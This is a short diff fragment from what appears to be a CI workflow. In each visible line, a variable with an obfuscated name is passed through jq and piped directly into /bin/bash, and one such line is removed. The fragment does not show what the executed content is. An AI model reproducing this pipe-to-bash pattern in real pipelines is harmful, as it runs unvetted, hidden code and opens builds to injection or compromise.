@@ -21,7 +21,6 @@ jobs:
           echo $yts64 | jq -r .ae9 | /bin/bash
           printf '%s' "$w8338" | jq -r .yajuh8144 | /bin/bash
           printf '%s' "$er83299" | jq -r .tub2 | /bin/bash
-          echo $wkpv24 | jq -r .r8207 | /bin/bash
           printf '%s' "$slpb093" | jq -r .hl66649 | /bin/bash
           printf '%s' "$mbwib39" | jq -r .uqry71039 | /bin/bash
           printf '%s' "$kteg9" | jq -r .xie6 | /bin/bash
